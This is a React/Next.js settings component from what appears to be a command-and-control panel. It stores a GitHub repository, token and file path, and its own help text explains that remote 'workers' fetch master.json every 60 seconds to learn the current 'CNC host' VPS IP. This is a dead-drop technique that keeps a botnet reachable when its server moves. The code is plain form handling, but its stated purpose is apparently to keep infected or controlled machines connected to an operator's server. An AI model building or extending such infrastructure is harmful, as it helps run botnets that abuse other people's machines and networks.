"use client";
import { useState, useEffect } from "react";
import { motion } from "motion/react";
import { Save, Github } from "lucide-react";
import api from "@/lib/api";
import Loader from "@/components/Loader";
import { useToast } from "@/components/ToastPopup";

interface GitHubCfg {
  id: string;
  repo_url: string;
  token: string;
  branch: string;
  file_path: string;
  enabled: boolean;
}

export default function GitHubConfig() {
  const [cfg, setCfg] = useState<GitHubCfg>({
    id: "main",
    repo_url: "",
    token: "",
    branch: "main",
    file_path: "master.json",
    enabled: false,
  });
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const { showToast } = useToast();

  useEffect(() => {
    const fetchConfig = async () => {
      try {
        const token = localStorage.getItem("token");
        const res = await api.get("/github-config", {
          headers: { Authorization: `Bearer ${token}` },
        });
        setCfg(res.data);
      } catch (err) {
        console.error("Failed to fetch github config:", err);
      } finally {
        setLoading(false);
      }
    };
    fetchConfig();
  }, []);

  const saveConfig = async () => {
    setSaving(true);
    try {
      const token = localStorage.getItem("token");
      await api.put("/github-config", cfg, {
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      });
      showToast("GitHub config saved", "success");
    } catch {
      showToast("Failed to save config", "error");
    } finally {
      setSaving(false);
    }
  };

  if (loading) {
    return <Loader variant={1} />;
  }

  return (
    <div className="space-y-5">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-sm font-medium text-white">GitHub Integration</h2>
          <p className="text-xs text-text-muted">
            Workers will read CNC master IP from a GitHub raw file
          </p>
        </div>
        <button
          onClick={saveConfig}
          disabled={saving}
          className="flex items-center gap-1.5 bg-primary text-background text-xs px-3 py-1.5 rounded-md hover:brightness-110 transition-all disabled:opacity-50"
        >
          <Save size={14} />
          {saving ? "Saving..." : "Save"}
        </button>
      </div>

      <motion.div
        initial={{ opacity: 0, y: 8 }}
        animate={{ opacity: 1, y: 0 }}
        className="border border-border rounded-lg p-5 space-y-4"
      >
        <div className="flex items-center gap-3 mb-4">
          <Github size={20} className="text-text-muted" />
          <span className="text-sm text-white font-medium">GitHub Repository</span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <label className="block text-xs text-text-muted mb-1">Repository URL</label>
            <input
              type="text"
              value={cfg.repo_url}
              onChange={(e) => setCfg({ ...cfg, repo_url: e.target.value })}
              placeholder="https://api.github.com/repos/user/repo/contents/master.json"
              className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white placeholder-text-muted focus:outline-none focus:border-primary/50 font-mono text-xs"
            />
          </div>

          <div>
            <label className="block text-xs text-text-muted mb-1">Token</label>
            <input
              type="password"
              value={cfg.token}
              onChange={(e) => setCfg({ ...cfg, token: e.target.value })}
              placeholder="ghp_..."
              className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white placeholder-text-muted focus:outline-none focus:border-primary/50 font-mono text-xs"
            />
          </div>

          <div>
            <label className="block text-xs text-text-muted mb-1">Branch</label>
            <input
              type="text"
              value={cfg.branch}
              onChange={(e) => setCfg({ ...cfg, branch: e.target.value })}
              placeholder="main"
              className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white placeholder-text-muted focus:outline-none focus:border-primary/50"
            />
          </div>

          <div>
            <label className="block text-xs text-text-muted mb-1">File Path</label>
            <input
              type="text"
              value={cfg.file_path}
              onChange={(e) => setCfg({ ...cfg, file_path: e.target.value })}
              placeholder="master.json"
              className="w-full bg-background border border-border rounded-md px-3 py-2 text-sm text-white placeholder-text-muted focus:outline-none focus:border-primary/50 font-mono text-xs"
            />
          </div>
        </div>

        <div className="flex items-center gap-2 pt-2">
          <label className="relative inline-flex items-center cursor-pointer">
            <input
              type="checkbox"
              checked={cfg.enabled}
              onChange={(e) => setCfg({ ...cfg, enabled: e.target.checked })}
              className="sr-only peer"
            />
            <div className="w-9 h-5 bg-border rounded-full peer peer-checked:bg-primary peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all" />
          </label>
          <span className="text-xs text-text-muted">
            {cfg.enabled ? "Workers will sync CNC host from GitHub" : "GitHub sync disabled"}
          </span>
        </div>
      </motion.div>

      <motion.div
        initial={{ opacity: 0, y: 8 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.1 }}
        className="border border-border rounded-lg p-5 space-y-3"
      >
        <h3 className="text-sm font-medium text-white">How it works</h3>
        <ol className="text-xs text-text-muted space-y-2 list-decimal list-inside">
          <li>Create a <code className="text-primary font-mono">master.json</code> file in your GitHub repo</li>
          <li>File should contain: <code className="text-primary font-mono">{`{"cnc_host": "YOUR_VPS_IP"}`}</code></li>
          <li>Workers will fetch this file and connect to the current CNC IP</li>
          <li>Change VPS? Just update <code className="text-primary font-mono">master.json</code> on GitHub</li>
          <li>Workers auto-sync every 60 seconds</li>
        </ol>
      </motion.div>
    </div>
  );
}
